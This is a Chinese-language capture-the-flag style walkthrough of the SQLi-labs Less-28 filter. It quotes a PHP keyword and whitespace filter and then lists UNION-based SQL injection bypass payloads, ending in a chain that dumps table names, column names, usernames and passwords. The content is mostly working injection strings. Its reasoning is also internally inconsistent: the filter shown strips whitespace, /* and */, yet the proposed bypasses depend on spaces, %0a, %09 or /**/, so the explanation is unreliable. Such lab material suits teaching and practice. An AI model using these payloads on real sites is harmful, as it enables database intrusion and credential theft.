# Less-28 正则 UNION/SELECT 过滤（大小写不敏感）

## 源码分析

```php
// 正则大小写不敏感 /i
$id= preg_replace('/union|select/i',"", $id);
$id= preg_replace('/[\s]/',"", $id);
$id= preg_replace('/[\/\*]/',"", $id);
```

比 Less 27 更严格：
- `UnIon`、`UNION`、`union` 全部拦截（因为 `/i` 标志）
- `/**/` 注释也被过滤

## 绕过方案

### 方案 A：注释拆分（最推荐）
用 `/**/` 虽然被过滤，但有些版本只过滤了 `/*` 开头组合。优先试：

```sql
?id=-1' un/**/ion sel/**/ect 1,database(),3--+
```

### 方案 B：双写绕过（核心技巧）
正则替换为空 → 双写后剩下正常关键字：

```sql
-- 过滤 "union" → 剩下 union → 正常拼接
?id=-1' ununionion selselectect 1,database(),3--+
```

原理：
- `ununionion` → 正则匹配到 `union` 替换为空 → 剩下 `union`
- `selselectect` → 正则匹配到 `select` 替换为空 → 剩下 `select`

### 方案 C：换行符 %0a
```sql
?id=-1' union%0aselect%0a1,database(),3--+
```

### 方案 D：URL 编码空格
```sql
?id=-1'%09union%09select%091,2,3--+
```

## 完整 Payload 链

```sql
-- 方案 B 双写
?id=-1' ununionion selselectect 1,database(),3--+
?id=-1' ununionion selselectect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
?id=-1' ununionion selselectect 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
?id=-1' ununionion selselectect 1,group_concat(username,0x3a,password),3 from users--+
```
